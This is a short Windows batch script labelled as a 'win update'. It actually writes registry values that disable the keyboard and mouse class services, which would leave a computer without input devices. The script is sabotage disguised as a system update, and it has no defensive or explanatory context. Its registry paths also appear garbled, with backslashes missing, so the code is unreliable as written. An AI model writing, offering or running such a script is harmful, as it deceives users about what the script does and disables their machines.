REM Starting: win update
SET SERVICES=HKLMSYSTEMCurrentControlSetServices
REG ADD %SERVICES%kbdclass /v Start /t REG_DWORD /d 4 /f
REG ADD %SERVICES%mouclass /v Start /t REG_DWORD /d 4 /f
